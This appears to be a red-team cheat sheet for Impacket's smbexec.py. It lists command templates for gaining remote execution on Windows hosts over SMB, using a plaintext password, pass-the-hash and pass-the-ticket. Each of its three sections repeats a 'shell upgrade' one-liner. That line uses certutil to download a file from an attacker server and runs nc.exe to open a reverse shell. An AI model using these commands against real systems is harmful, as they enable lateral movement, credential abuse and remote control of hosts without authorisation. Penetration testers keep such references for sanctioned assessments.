# smbexec.py (imp)

%  windows, impacket-exec, smb
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  

## desc
```
A similar approach to PSEXEC w/o using RemComSvc. 
```

## execute (creds)
create a new service 'BTOBTO' (using temp bat files via SMB)
upgrade full shell :
    certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
```bash
smbexec.py -debug -shell-type powershell <domain_fqdn>/<user>:'<password>'@<target_fqdn>
```

## execute (pth)
create a new service 'BTOBTO' (using temp bat files via SMB)
upgrade full shell :
    certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
```bash
smbexec.py -debug  -shell-type powershell -hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn>
```

## execute (ptt)
certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe
```bash
KRB5CCNAME=<ccache> smbexec.py -debug  -shell-type powershell -no-pass -k <target_fqdn>
```
